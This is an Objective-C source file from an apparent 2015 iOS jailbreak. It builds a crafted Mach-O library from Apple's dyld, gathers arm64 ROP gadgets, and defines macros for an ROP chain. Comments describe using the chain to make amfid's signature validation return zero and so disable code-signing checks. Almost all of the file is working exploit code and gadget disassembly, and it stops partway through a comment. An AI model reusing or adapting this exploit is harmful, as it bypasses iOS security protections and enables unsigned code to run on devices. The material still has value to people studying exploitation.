//
//  main.m
//  build-o
//
//  Created by qwertyoruiop on 14/09/15.
//  Copyright (c) 2015 Kim Jong Cracks. All rights reserved.
//

//  thanks to windknown & pangu team

#include <mach-o/loader.h>
#include <mach-o/ldsyms.h>
#include <mach-o/reloc.h>
#include <mach/mach.h>
#include <mach-o/fat.h>
#include <mach-o/getsect.h>
#include <sys/syscall.h>
#import <Foundation/Foundation.h>
#import "libxnuexp.h"

typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_ool_descriptor_t desc;
  mach_msg_trailer_t trailer;
} oolmsg_t;
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_ool_descriptor_t desc;
  mach_msg_trailer_t trailer;
  char oolrcvbuf[4096];
} oolmsgrcv_t;

#if __LP64__
#define mach_header			mach_header_64
#define macho_header			mach_header_64
//#define LC_SEGMENT		LC_SEGMENT_64
#define LC_SEGMENT_COMMAND		LC_SEGMENT_64

#define segment_command	segment_command_64
#define macho_segment_command	segment_command_64

#define macho_section			section_64
#define RELOC_SIZE				3
#else
#define macho_header			mach_header
#define LC_SEGMENT_COMMAND		LC_SEGMENT
#define macho_segment_command	segment_command
#define macho_section			section
#define RELOC_SIZE				2
#endif


#define POINTER_RELOC GENERIC_RELOC_VANILLA


void rebaseDyld(const struct macho_header* mh, intptr_t slide)
{
  printf("%p\n", (void *)slide);
  // rebase non-lazy pointers (which all point internal to dyld, since dyld uses no shared libraries)
  // and get interesting pointers into dyld
  const uint32_t cmd_count = mh->ncmds;
  const struct load_command* const cmds = (struct load_command*)(((char*)mh)+sizeof(struct macho_header));
  const struct load_command* cmd = cmds;
  const struct macho_segment_command* linkEditSeg = NULL;
  const struct dysymtab_command* dynamicSymbolTable = NULL;
  for (uint32_t i = 0; i < cmd_count; ++i) {
    switch (cmd->cmd) {
      case LC_SEGMENT_COMMAND:
      {
        const struct macho_segment_command* seg = (struct macho_segment_command*)cmd;
        if ( strcmp(seg->segname, "__LINKEDIT") == 0 )
        linkEditSeg = seg;
        const struct macho_section* const sectionsStart = (struct macho_section*)((char*)seg + sizeof(struct macho_segment_command));
        const struct macho_section* const sectionsEnd = &sectionsStart[seg->nsects];
        for (const struct macho_section* sect=sectionsStart; sect < sectionsEnd; ++sect) {
          const uint8_t type = sect->flags & SECTION_TYPE;
          if ( type == S_NON_LAZY_SYMBOL_POINTERS ) {
            // rebase non-lazy pointers (which all point internal to dyld, since dyld uses no shared libraries)
            const uint32_t pointerCount = (uint32_t)(sect->size / sizeof(uintptr_t));
            uintptr_t* const symbolPointers = (uintptr_t*)(sect->addr + slide);
            for (uint32_t j=0; j < pointerCount; ++j) {
              symbolPointers[j] += slide;
            }
          }
        }
      }
      break;
      case LC_DYSYMTAB:
      dynamicSymbolTable = (struct dysymtab_command *)cmd;
      break;
    }
    cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
  }

  // use reloc's to rebase all random data pointers
  const uintptr_t relocBase = (uintptr_t)mh;
  const struct relocation_info* const relocsStart = (struct relocation_info*)(relocBase + dynamicSymbolTable->locreloff);
  const struct relocation_info* const relocsEnd = &relocsStart[dynamicSymbolTable->nlocrel];
  for (const struct relocation_info* reloc=relocsStart; reloc < relocsEnd; ++reloc) {
    if ( reloc->r_length != RELOC_SIZE ) {
      assert(!"relocation in dyld has wrong size %d");
    }
    if ( reloc->r_type != POINTER_RELOC )
    assert(!"relocation in dyld has wrong type");

    // update pointer by amount dyld slid
    *((uintptr_t*)(reloc->r_address + relocBase)) += slide;
  }
}

void *g_text_ptr = NULL;
size_t g_text_size = 0;
size_t g_text_vmsize = 0;
void *g_data_ptr = NULL;
void *r_data_ptr = NULL;
size_t g_data_size = 0;
size_t g_data_vmsize = 0;
void *g_lnk_ptr = NULL;
size_t g_lnk_size = 0;
size_t g_lnk_vmsize = 0;

void *g_cs_ptr = NULL;
size_t g_cs_size = 0;

struct dysymtab_command* g_dy_ptr = 0;
void dump_dyld_segments(const uint8_t *macho_data)
{
  if (*(uint32_t *)macho_data == MH_MAGIC)
  {
    uint64_t text_file_off = 0;
    uint64_t text_file_size = 0;
    uint64_t cs_offset = 0;
    uint64_t cs_size = 0;

    struct mach_header* header = (struct mach_header*)macho_data;

    struct load_command *load_cmd = (struct load_command *)(header + 1);
    for (int i=0; i<header->ncmds; i++)
    {
      if (load_cmd->cmd == LC_SEGMENT)
      {
        struct segment_command *seg = (struct segment_command *)load_cmd;
        if (strcmp(seg->segname, "__TEXT") == 0)
        {
          text_file_off = seg->fileoff;
          text_file_size = seg->filesize - 0x1000;

          g_text_size = text_file_size;
          g_text_ptr = malloc(text_file_size);
          if (g_text_ptr == NULL)
          {
            NSLog(@"No place for text!");
          }

          memcpy(g_text_ptr, macho_data+text_file_off+0x1000, text_file_size);

        } else
        if (strcmp(seg->segname, "__DATA") == 0)
        {
          text_file_off = seg->fileoff;
          text_file_size = seg->filesize;

          g_data_size = text_file_size;
          g_data_vmsize = seg->vmsize;

          g_data_ptr = malloc(text_file_size);
          if (g_text_ptr == NULL)
          {
            NSLog(@"No place for data!");
          }

          memcpy(g_data_ptr, macho_data+text_file_off, text_file_size);

          r_data_ptr = malloc(g_data_size);
          if (r_data_ptr == NULL)
          {
            NSLog(@"No place for data!");
          }

          memcpy(r_data_ptr, macho_data+text_file_off, text_file_size);

        }
        else
        if (strcmp(seg->segname, "__LINKEDIT") == 0)
        {
          text_file_off = seg->fileoff;
          text_file_size = seg->filesize;

          g_lnk_size = text_file_size;

          g_lnk_ptr = malloc(text_file_size);
          if (g_text_ptr == NULL)
          {
            NSLog(@"No place for linkedit!");
          }

          memcpy(g_lnk_ptr, macho_data+text_file_off, text_file_size);

        }

      } else if (load_cmd->cmd == LC_CODE_SIGNATURE)
      {
        struct linkedit_data_command* cscmd = (struct linkedit_data_command*)load_cmd;

        cs_offset = cscmd->dataoff;
        cs_size = cscmd->datasize;

        g_cs_size = cs_size;
        g_cs_ptr = malloc(cs_size);
        if (g_cs_ptr == NULL)
        {
          NSLog(@"no place for cs!");
        }

        memcpy(g_cs_ptr, macho_data+cs_offset, cs_size);

        NSLog(@"cs_size = %x", (uint32_t)cs_size);
      }

      load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
    }
  }
  else if (*(uint32_t *)macho_data == MH_MAGIC_64)
  {
    NSLog(@"64 dyld!");

    uint64_t text_file_off_64 = 0;
    uint64_t text_file_size_64 = 0;
    uint64_t cs_offset_64 = 0;
    uint64_t cs_size_64 = 0;

    struct mach_header_64* header = (struct mach_header_64*)macho_data;

    struct load_command *load_cmd = (struct load_command *)(header + 1);
    for (int i=0; i<header->ncmds; i++)
    {
      if (load_cmd->cmd == LC_SEGMENT_64)
      {
        struct segment_command_64 *seg = (struct segment_command_64 *)load_cmd;
        if (strcmp(seg->segname, "__TEXT") == 0)
        {
          g_text_vmsize = seg->vmsize;
          text_file_off_64 = seg->fileoff;
          text_file_size_64 = seg->filesize-0x1000;

          g_text_size = text_file_size_64;

          g_text_ptr = malloc(text_file_size_64);
          if (g_text_ptr == NULL)
          {
            NSLog(@"No place for text!");
          }
          memcpy(g_text_ptr, macho_data+text_file_off_64+0x1000, text_file_size_64);

        } else
        if (strcmp(seg->segname, "__DATA") == 0)
        {
          rebaseDyld((const struct macho_header*)0x150000000, 0x150000000-0x120000000);
          text_file_off_64 = seg->fileoff;
          text_file_size_64 = seg->filesize;

          g_data_size = text_file_size_64;
          g_data_vmsize = seg->vmsize;

          g_data_ptr = malloc(g_data_size);
          if (g_data_ptr == NULL)
          {
            NSLog(@"No place for data!");
          }

          memcpy(g_data_ptr, macho_data+text_file_off_64, g_data_size);


          r_data_ptr = malloc(g_data_size);
          if (r_data_ptr == NULL)
          {
            NSLog(@"No place for data!");
          }

          memcpy(r_data_ptr, macho_data+text_file_off_64, g_data_size);

        } else
        if (strcmp(seg->segname, "__LINKEDIT") == 0)
        {
          text_file_off_64 = seg->fileoff;
          text_file_size_64 = seg->filesize;

          g_lnk_size = text_file_size_64;
          g_lnk_vmsize = seg->vmsize;

          g_lnk_ptr = malloc(text_file_size_64);
          if (g_text_ptr == NULL)
          {
            NSLog(@"No place for text!");
          }

          memcpy(g_lnk_ptr, macho_data+text_file_off_64, text_file_size_64);

        }

      } else if (load_cmd->cmd == LC_CODE_SIGNATURE)
      {
        struct linkedit_data_command* cscmd = (struct linkedit_data_command*)load_cmd;

        cs_offset_64 = cscmd->dataoff;
        cs_size_64 = cscmd->datasize;
        g_cs_size = cs_size_64;

        g_cs_ptr = malloc(cs_size_64);
        if (g_cs_ptr == NULL)
        {
          NSLog(@"no place for cs!");
        }

        memcpy(g_cs_ptr, macho_data+cs_offset_64, cs_size_64);

        NSLog(@"cs_size = %llx", cs_size_64);
      }
      else if (load_cmd->cmd == LC_DYSYMTAB)
      {
        struct dysymtab_command* dyc = (struct dysymtab_command*)load_cmd;


        g_dy_ptr = dyc;
        if (g_dy_ptr == NULL)
        {
          NSLog(@"no place for dysym!");
        }

      }
      load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
    }
  }
  assert(g_cs_size > 0);
  assert(g_data_size > 0);
  assert(g_text_size > 0);
  assert(g_lnk_size > 0);
  g_lnk_size = round_page(g_lnk_size);
}



void process_dyld_file(NSString *srcPath)
{
  // get an valid signature
  NSFileHandle *inputHdl = [NSFileHandle fileHandleForReadingAtPath:srcPath];
  if (inputHdl == nil)
  {
    NSLog(@"open input file fail");
    return;
  }

  NSData *header = [inputHdl readDataOfLength:2048];
  struct fat_header *fat_hdr = (struct fat_header *)[header bytes];
  if (OSSwapInt32(fat_hdr->magic) == FAT_MAGIC)
  {
    NSLog(@"input is a fat file");
    struct fat_arch *arch = (struct fat_arch *)(fat_hdr + 1);
    for (int i=0; i<OSSwapInt32(fat_hdr->nfat_arch); i++)
    {
      [inputHdl seekToFileOffset:OSSwapInt32(arch->offset)];
      NSData *myData = [inputHdl readDataOfLength:OSSwapInt32(arch->size)];

      const uint8_t *headerc =  [myData bytes];
      uint8_t *header = mmap((void*)0x150000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
      memcpy(header, headerc, [myData length]);
      if (*(uint32_t *)header != MH_MAGIC_64) continue;

      dump_dyld_segments(header);
      arch++;
    }
  }
  else
  {
    [inputHdl seekToFileOffset:0];
    NSData *myData = [inputHdl readDataToEndOfFile];
    const uint8_t *headerc =  [myData bytes];
    uint8_t *header = mmap((void*)0x150000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    memcpy(header, headerc, [myData length]);
    //  rebaseDyld(header, header - 0x120000000);
    dump_dyld_segments(header);
  }
}

int main(int argc, const char * argv[]) {

  /* mapping */

  uint64_t fsz = 0;

  NSString *dyld_path = @"./dyld";

  process_dyld_file(dyld_path);

  NSLog(@"proc'd");

  uintptr_t dyld_base = 0x150001000;
  #define DeclGadget(name, pattern, size) uint64_t name = (uint64_t)memmem(g_text_ptr, g_text_size, (void*)pattern, size); assert(name); name -= (uint64_t)g_text_ptr; name += (uint64_t)dyld_base


  int fd=open("./magic64_amfid.dylib", O_CREAT | O_RDWR | O_TRUNC, 0755);
  assert(fd > 0);
  ftruncate(fd, (0x10000000));
  char* buf = mmap(NULL, (0x10000000), PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  assert(buf != (void *)-1);

  /* write mach header */

  xnuexp_mach_o * dy = [xnuexp_mach_o withContentsOfFile:dyld_path];
  //  assert(dy.hdr->cpusubtype == mh.cpusubtype && dy.hdr->cputype == mh.cputype);
  if (!dy) {
    xnuexp_fat_mach_o  * fat_dy = [xnuexp_fat_mach_o withContentsOfFile:dyld_path];
    dy = [fat_dy getArchitectureByFirstMagicMatch:MH_MAGIC];
    assert(fat_dy && dy);
  }

  struct mach_header_64 mh;
  mh.magic = dy.hdr->magic;
  mh.filetype = MH_EXECUTE; // must be MH_EXECUTE non-PIE (bug 1)
  mh.flags = MH_EXECUTE; // must be MH_EXECUTE non-PIE (bug 1)
  mh.cputype = dy.hdr->cputype;
  mh.cpusubtype = dy.hdr->cpusubtype;
  mh.ncmds=0;
  mh.sizeofcmds=0;

  /* required on iOS */

  struct dyld_info_command dyld_ic;
  bzero(&dyld_ic, sizeof(dyld_ic));
  dyld_ic.cmd=LC_DYLD_INFO;
  dyld_ic.cmdsize=sizeof(dyld_ic);
  dyld_ic.export_off = 1337;

  memcpy(buf + mh.sizeofcmds + sizeof(mh), &dyld_ic, dyld_ic.cmdsize);
  mh.sizeofcmds += dyld_ic.cmdsize;
  mh.ncmds++;

  /* FakeTEXT segment */

  struct segment_command load_cmd_seg;
  load_cmd_seg.fileoff = 0;
  load_cmd_seg.filesize = (uint64_t)g_text_size + 0x1000;
  load_cmd_seg.vmsize = (uint64_t)g_text_size + 0x1000;
  load_cmd_seg.vmaddr = 0x150000000;
  load_cmd_seg.initprot = PROT_READ|PROT_EXEC; // must be EXEC
  load_cmd_seg.maxprot = PROT_READ|PROT_EXEC; // must be EXEC
  load_cmd_seg.cmd = LC_SEGMENT_64;
  load_cmd_seg.cmdsize = sizeof(load_cmd_seg);
  load_cmd_seg.flags = 0;
  load_cmd_seg.nsects = 0;
  strcpy(&load_cmd_seg.segname[0], "__DYLDTEXT"); // must be __PAGEZERO (bug 2)
  memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
  mh.sizeofcmds += load_cmd_seg.cmdsize;
  mh.ncmds++;


  char *code_data = (char*)(buf + 0x1000);
  memcpy(code_data, g_text_ptr, g_text_size);

  fsz += load_cmd_seg.vmsize;

  load_cmd_seg.initprot = PROT_READ|PROT_WRITE; // must be non-EXEC to be usable
  load_cmd_seg.maxprot = PROT_READ|PROT_WRITE; // must be non-EXEC to be usable

  load_cmd_seg.vmaddr = 0x150000000 + fsz;
  load_cmd_seg.fileoff = fsz;
  load_cmd_seg.filesize = (uint64_t)g_data_size;
  load_cmd_seg.vmsize = (uint64_t)g_data_vmsize;
  strcpy(&load_cmd_seg.segname[0], "__DYLDDATA");
  memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
  mh.sizeofcmds += load_cmd_seg.cmdsize;
  mh.ncmds++;

  code_data = (char*)(buf + fsz);
  memcpy(code_data, r_data_ptr, g_data_size);

  fsz += load_cmd_seg.filesize;

  load_cmd_seg.vmaddr = 0x150000000 + g_data_vmsize + g_text_size + 0x1000;
  load_cmd_seg.fileoff = fsz;
  load_cmd_seg.filesize = (uint64_t)g_lnk_size;
  load_cmd_seg.vmsize = (uint64_t)g_lnk_vmsize;
  strcpy(&load_cmd_seg.segname[0], "__DYLDLINKEDIT");
  memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
  mh.sizeofcmds += load_cmd_seg.cmdsize;
  mh.ncmds++;

  code_data = (char*)(buf + fsz);
  memcpy(code_data, g_lnk_ptr, g_lnk_size);

  fsz += load_cmd_seg.vmsize;

  __unused char *data = (char*)(buf + fsz);
  __unused char *dptr = (char*)(0x15A000000);

  DeclGadget(mov_sp_x29_pop_x29_x30_ret, (&(char[]){0xbf, 0x03, 0x00, 0x91, 0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6}), 12);
  DeclGadget(str_x20_x19_ldr_x29x30x20x19x22x21, (&(char[]){0x74,0x02,0x00,0xF9,0xFD,0x7B,0x42,0xA9,0xF4,0x4F,0x41,0xA9 ,0xF6 ,0x57 ,0xC3 ,0xA8 ,0xC0 ,0x03 ,0x5F ,0xD6}), 20);
  DeclGadget(str_x0_x19_ldr_x29x30x20x19x22x21, (&(char[]){0xf4,0x03,0x00,0xaa,0x74,0x02,0x00,0xF9,0xFD,0x7B,0x42,0xA9,0xF4,0x4F,0x41,0xA9 ,0xF6 ,0x57 ,0xC3 ,0xA8 ,0xC0 ,0x03 ,0x5F ,0xD6}), 24);
  DeclGadget(sub_sp_x29_80_load_x29x30x20x21x24x23x26x25x28x27_ret, (&(char[]){0xBF,0x43 ,0x01 ,0xD1 ,0xFD ,0x7B ,0x45 ,0xA9 ,0xF4 ,0x4F ,0x44 ,0xA9 ,0xF6 ,0x57 ,0x43 ,0xA9 ,0xF8 ,0x5F ,0x42 ,0xA9 ,0xFA ,0x67 ,0x41 ,0xA9 ,0xFC ,0x6F ,0xC6 ,0xA8 ,0xC0 ,0x03 ,0x5F ,0xD6}), 0x20);

  DeclGadget(do_fcall_4, (&(char[]){0x04 ,0x51 ,0x41 ,0xF9 ,0xE0 ,0x03 ,0x13 ,0xAA ,0xE1 ,0x03 ,0x17 ,0xAA ,0xE2 ,0x03 ,0x15 ,0xAA ,0xE3 ,0x03 ,0x1A ,0xAA ,0xBF ,0x43 ,0x01 ,0xD1 ,0xFD ,0x7B ,0x45 ,0xA9 ,0xF4 ,0x4F ,0x44 ,0xA9 ,0xF6 ,0x57 ,0x43 ,0xA9 ,0xF8 ,0x5F ,0x42 ,0xA9 ,0xFA ,0x67 ,0x41 ,0xA9 ,0xFC ,0x6F ,0xC6 ,0xA8 ,0x80 ,0x00 ,0x1F ,0xD6}), 0x34);

  DeclGadget(ldr_x8, (&(char[]){0x68,0x06,0x40,0xF9,0x08,0x01,0x17,0x8B,0x68,0x06,0x00,0xF9,0xBF,0xC3,0x00,0xD1,0xFD,0x7B,0x43,0xA9,0xF4,0x4F,0x42,0xA9,0xF6,0x57,0x41,0xA9,0xF8,0x5F,0xC4,0xA8,0xC0,0x03,0x5F,0xD6}), 0x24);

  DeclGadget(ldr_x0x8_32_ldp_x29x30x20x19_ret, (&(char[]){0x00 ,0x11 ,0x40 ,0xF9 ,0xFD ,0x7B ,0x41 ,0xA9 ,0xF4 ,0x4F ,0xC2 ,0xA8 ,0xC0 ,0x03 ,0x5F ,0xD6}), 16);
  DeclGadget(add_x0x21_ldp_x20x30x20x19x22x21_ret, (&(char[]){0x00 ,0x00 ,0x15 ,0x8B ,0xFD ,0x7B ,0x42 ,0xA9 ,0xF4 ,0x4F ,0x41 ,0xA9 ,0xF6 ,0x57 ,0xC3 ,0xA8 ,0xC0 ,0x03 ,0x5F ,0xD6}), 0x14);

  DeclGadget(mov_x0_0_ret, (&(char[]){0x00,0x00,0x80,0xd2,0xc0,0x03,0x5f,0xd6}), 8);

  /*
  0000000120002eb0	d2800000	movz	x0, #0
  0000000120002eb4	d65f03c0	ret

  */

  #define segstack ((((uint64_t)stack) - ((uint64_t)stackbase)) + segstackbase)\

  uint64_t* stack_tmp = 0;


  #define Set19_20_21_22_23_24_25_26_27_28(r19,r20,r21,r22,r23,r24,r25,r26,r27,r28) \
  stack_tmp = stack;\
  *stack = 0x2929000029290000; stack++; \
  *stack = sub_sp_x29_80_load_x29x30x20x21x24x23x26x25x28x27_ret; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = r28; stack++; \
  *stack = r27; stack++; \
  *stack = r26; stack++; \
  *stack = r25; stack++; \
  *stack = r24; stack++; \
  *stack = r23; stack++; \
  *stack = r22; stack++; \
  *stack = r21; stack++; \
  *stack = r20; stack++; \
  *stack = r19; stack++; \
  *stack_tmp = segstack; \
  stack_tmp = stack; \
  *stack = 0; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack_tmp = segstack

  #define WriteWhatWhere(what, where) \
  Set19_20_21_22_23_24_25_26_27_28(where,what,0,0,0,0,0,0,0,0);\
  stack_tmp = stack;\
  *stack++ = 0x4141414141414141;\
  *stack++ = str_x20_x19_ldr_x29x30x20x19x22x21;\
  *stack++ = 0x4141414241414141;\
  *stack++ = 0x4141414341414141;\
  *stack++ = 0x4141414441414141;\
  *stack++ = 0x4141414541414141;\
  *stack_tmp = segstack; \
  stack_tmp = stack; \
  *stack = 0; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack_tmp = segstack

  #define AddR0(value) \
  Set19_20_21_22_23_24_25_26_27_28(0,0,value,0,0,0,0,0,0,0);\
  stack_tmp = stack;\
  *stack++ = 0x4141414141414141;\
  *stack++ = add_x0x21_ldp_x20x30x20x19x22x21_ret;\
  *stack++ = 0x4141414241414141;\
  *stack++ = 0x4141414341414141;\
  *stack++ = 0x4141414441414141;\
  *stack++ = 0x4141414541414141;\
  *stack_tmp = segstack; \
  stack_tmp = stack; \
  *stack = 0; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack_tmp = segstack



  #define WriteR0(where) \
  Set19_20_21_22_23_24_25_26_27_28(where,0,0,0,0,0,0,0,0,0);\
  stack_tmp = stack;\
  *stack++ = 0x4141414141414141;\
  *stack++ = str_x0_x19_ldr_x29x30x20x19x22x21;\
  *stack++ = 0x4141414241414141;\
  *stack++ = 0x4141414341414141;\
  *stack++ = 0x4141414441414141;\
  *stack++ = 0x4141414541414141;\
  *stack_tmp = segstack; \
  stack_tmp = stack; \
  *stack = 0; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack_tmp = segstack

  #define LoadR0(where) \
  Set8(where-32);\
  stack_tmp = stack;\
  *stack++ = 0x4141414141414141;\
  *stack++ = ldr_x0x8_32_ldp_x29x30x20x19_ret;\
  *stack++ = 0x4141414241414141;\
  *stack++ = 0x4141414341414141;\
  *stack_tmp = segstack; \
  stack_tmp = stack; \
  *stack = 0; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack_tmp = segstack

  #define Set8(value)\
  Set19_20_21_22_23_24_25_26_27_28(SEG_VAR(zero)-8,0x4141414141414141,0x4141414141414141,0x4141414141414141,value,0x4141414141414141,0x4141414141414141,0x4141414141414141,0x4141414141414141,0x4141414141414141);\
  stack_tmp = stack;\
  *stack = 0x2929000029290000; stack++; \
  *stack = ldr_x8; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack_tmp = segstack; \
  stack_tmp = stack; \
  *stack = 0; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack_tmp = segstack;\
  WriteWhatWhere(0, SEG_VAR(zero))\

  #define FuncCall4(pointer, arg1, arg2, arg3, arg4) \
  WriteWhatWhere(pointer, SEG_VAR(tmp1));\
  Set8(SEG_VAR(tmp1) - 672);\
  Set19_20_21_22_23_24_25_26_27_28(arg1,0x4141414141414141,arg3,0x4141414141414141,arg2,0x4141414141414141,0x4141414141414141,arg4,0x4141414141414141,0x4141414141414141);\
  stack_tmp = stack;\
  *stack = 0x2929000029290000; stack++; \
  *stack = do_fcall_4; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack = 0x2929292929292929; stack++; \
  *stack_tmp = segstack; \
  stack_tmp = stack; \
  *stack = 0; stack++; \
  *stack = mov_sp_x29_pop_x29_x30_ret; stack++; \
  *stack_tmp = segstack


  #define DoSyscall(sysnumber, a,b,c,d,e,f,g) \
  FuncCall4([dy solveSymbol:@"_syscall"], sysnumber, 0, 0, 0);\
  *stack++ = a;\
  *stack++ = b;\
  *stack++ = c;\
  *stack++ = d;\
  *stack++ = e;\
  *stack++ = f;\
  *stack++ = g;\
  *stack++ = 0;\
  *stack_tmp = segstack



  /*
  ldr_x8:
  000000012001dd60	f9400668	ldr	x8, [x19, #8]
  000000012001dd64	8b170108	add	 x8, x8, x23
  000000012001dd68	f9000668	str	x8, [x19, #8]
  000000012001dd6c	d100c3bf	sub	sp, x29, #48
  000000012001dd70	a9437bfd	ldp	x29, x30, [sp, #48]
  000000012001dd74	a9424ff4	ldp	x20, x19, [sp, #32]
  000000012001dd78	a94157f6	ldp	x22, x21, [sp, #16]
  000000012001dd7c	a8c45ff8	ldp	x24, x23, [sp], #64
  000000012001dd80	d65f03c0	ret

  68 06 40 F9 08 01 17 8B 68 06 00 F9 BF C3 00 D1 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 F8 5F C4 A8 C0 03 5F D6

  do_fcall_4:
  000000012000f050	f9415104	ldr	x4, [x8, #672]
  000000012000f054	aa1303e0	mov	 x0, x19
  000000012000f058	aa1703e1	mov	 x1, x23
  000000012000f05c	aa1503e2	mov	 x2, x21
  000000012000f060	aa1a03e3	mov	 x3, x26
  000000012000f064	d10143bf	sub	sp, x29, #80
  000000012000f068	a9457bfd	ldp	x29, x30, [sp, #80]
  000000012000f06c	a9444ff4	ldp	x20, x19, [sp, #64]
  000000012000f070	a94357f6	ldp	x22, x21, [sp, #48]
  000000012000f074	a9425ff8	ldp	x24, x23, [sp, #32]
  000000012000f078	a94167fa	ldp	x26, x25, [sp, #16]
  000000012000f07c	a8c66ffc	ldp	x28, x27, [sp], #96
  000000012000f080	d61f0080	br	x4

  04 51 41 F9 E0 03 13 AA E1 03 17 AA E2 03 15 AA E3 03 1A AA BF 43 01 D1 FD 7B 45 A9 F4 4F 44 A9 F6 57 43 A9 F8 5F 42 A9 FA 67 41 A9 FC 6F C6 A8 80 00 1F D6

  */

  load_cmd_seg.vmaddr = 0x151000000;
  load_cmd_seg.fileoff = fsz;
  load_cmd_seg.filesize = 0x200000;
  load_cmd_seg.vmsize = 0x200000;
  strcpy(&load_cmd_seg.segname[0], "__ROPCHAIN");
  memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
  mh.sizeofcmds += load_cmd_seg.cmdsize;
  mh.ncmds++;
  uint64_t *stack = (uint64*)(buf + fsz + 0x10000);

  uint64_t *stackbase = stack;
  uint64_t segstackbase = load_cmd_seg.vmaddr + 0x10000;


  /*

  OK, i suck at arm64 ROP. let's see what I can do about it..

  64 dyld ROP gadgets

  write-what-where

  sub_sp_x29_80_load_x29x30x20x21x24x23x26x25x28x27_ret:

  0000000120012898	d10143bf	sub	sp, x29, #80
  000000012001289c	a9457bfd	ldp	x29, x30, [sp, #80]
  00000001200128a0	a9444ff4	ldp	x20, x19, [sp, #64]
  00000001200128a4	a94357f6	ldp	x22, x21, [sp, #48]
  00000001200128a8	a9425ff8	ldp	x24, x23, [sp, #32]
  00000001200128ac	a94167fa	ldp	x26, x25, [sp, #16]
  00000001200128b0	a8c66ffc	ldp	x28, x27, [sp], #96
  00000001200128b4	d65f03c0	ret


  000000012000f40c	f9401100	ldr	x0, [x8, #32]
  000000012000f410	a9417bfd	ldp	x29, x30, [sp, #16]
  000000012000f414	a8c24ff4	ldp	x20, x19, [sp], #32
  000000012000f418	d65f03c0	ret

  0000000120018234	aa1303e0	mov	 x0, x19
  0000000120018238	d63f0100	blr	x8

  000000012001497c	aa1303e0	mov	 x0, x19
  0000000120014980	aa1903e1	mov	 x1, x25
  0000000120014984	d63f0100	blr	x8

  0000000120015e9c	aa1303e2	mov	 x2, x19
  0000000120015ea0	aa1403e3	mov	 x3,  x20
  0000000120015ea4	d63f0120	blr	x9

  000000012001788c	aa1403e4	mov	 x4, x20
  0000000120017890	d63f0100	blr	x8

  00000001200198a4	aa1503e5	mov	 x5, x21
  00000001200198a8	d63f0100	blr	x8

  0000000120014808	aa1a03e7	mov	 x7, x26
  000000012001480c	d63f0100	blr	x8



  0000000120002b6c	f9000274	str	 x20, [x19]
  0000000120002b70	a9427bfd	ldp	x29, x30, [sp, #32]
  0000000120002b74	a9414ff4	ldp	x20, x19, [sp, #16]
  0000000120002b78	a8c357f6	ldp	x22, x21, [sp], #48
  0000000120002b7c	d65f03c0	ret

  control x0

  000000012000b2bc	aa1303e0	mov	 x0, x19
  000000012000b2c0	a9417bfd	ldp	x29, x30, [sp, #16]
  000000012000b2c4	a8c24ff4	ldp	x20, x19, [sp], #32
  000000012000b2c8	d65f03c0	ret

  000000012000f730	add	 x0, x0, x21
  000000012000f734	ldp	x29, x30, [sp, #32]
  000000012000f738	ldp	x20, x19, [sp, #16]
  000000012000f73c	ldp	x22, x21, [sp], #48
  000000012000f740	ret


  x0 = 0  -> patch MISValidateSignature lazy sym table entry to this

  0000000120002eb0	d2800000	movz	x0, #0
  0000000120002eb4	d65f03c0	ret



  */



  #define SEG_VAR(var) ((uint64_t)((char*)(&(args_seg->var))))

  typedef struct args {
    fsignatures_t sig;
    uint64_t drugs;
    char msg[128];
    char path[64];
    uint64_t image_ptr;
    uint64_t zero;
    char scratch[1024];
    uint64_t tmp1;
    uint64_t amfi_fd;
    uint64_t retv;
    uint64_t shared_cache_base;
    uint64_t zero_this;
    char dys[32];
  } args_t;

  args_t args;
  args_t* argss = &args;
  args_t* args_seg = (args_t*) 0x152000000;
  bzero(argss, sizeof(args));

  strcpy(argss->msg, "this is arm64 rop! -qwertyoruiop\namfi fd: %p\nfcntl ret: %p\n");
  strcpy(argss->path, "/usr/libexec/amfid_");
  strcpy(argss->dys, "__dyld_fast_stub_entry");
  /*
  struct kern_stackframe {
  uint64_t image_ptr;
  uint64_t argc;
